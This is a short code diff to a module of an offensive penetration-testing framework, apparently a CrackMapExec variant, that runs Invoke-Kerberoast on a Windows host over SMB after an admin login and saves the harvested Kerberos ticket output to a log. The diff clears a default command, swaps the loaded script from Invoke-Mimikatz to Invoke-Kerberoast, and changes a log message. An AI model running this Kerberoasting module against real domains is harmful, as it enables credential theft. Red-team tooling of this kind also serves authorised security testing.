@@ -27,12 +27,12 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
 
         """
         #self.command = '-Credential $Cred -Verbose -Domain testlab.local'
-        self.command = '-Credential $Cred -Verbose -Domain testlab.local'
+        self.command = ''
         if module_options and 'COMMAND' in module_options:
             self.command = module_options['COMMAND']
             
 
-        self.ps_script = clean_ps_script('powershell_scripts/Invoke-Mimikatz.ps1')
+        self.ps_script = clean_ps_script('powershell_scripts/Invoke-Kerberoast.ps1')
 
     def on_admin_login(self, context, connection):
         command = "Invoke-Kerberoast {}".format(self.command)
@@ -82,4 +82,4 @@ cmx --verbose smb 192.168.1.1 -u username -p password -M kerberoast -mo '-Creden
             write_log(str(data, 'utf-8'), log_name)
             context.log.info("Saved raw Kerberoast output to {}/{}".format(cfg.LOGS_PATH,log_name))
         else:
-            context.log.info("No Results ¯\\_(ツ)_/¯")
+            context.log.info("No Results ¯\\_('_')_/¯")
